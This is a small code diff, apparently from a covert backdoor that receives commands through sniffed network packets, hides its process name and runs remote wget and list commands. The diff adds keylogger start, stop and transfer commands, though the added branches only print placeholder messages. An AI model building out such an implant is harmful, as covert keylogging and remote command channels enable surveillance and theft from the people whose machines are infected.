@@ -16,7 +16,7 @@ import sys
 
 # Custom Modules
 from utils.encryption import StreamEncryption
-from utils.shell import LIST, WGET
+from utils.shell import LIST, WGET, WATCH, KEYLOGGER, STOP, START, TRANSFER
 from utils.validation import validate_ipv4_address, validate_nic_interface
 from utils.process import hide_process_name
 
@@ -165,6 +165,13 @@ def packet_handler(pkt):
         if argv[0] == LIST:
             execute_list_command(argv[1])
             return
+        if argv[0] == KEYLOGGER:
+            if argv[1] == STOP:
+                print("Stop the keylogger!")
+            if argv[1] == START:
+                print("Start the keylogger!")
+            if argv[1] == TRANSFER:
+                print("Transfer the keylogger!")
     if argc == 3:
         if argv[0] == WGET:
             execute_wget_command(argv[1], argv[2])
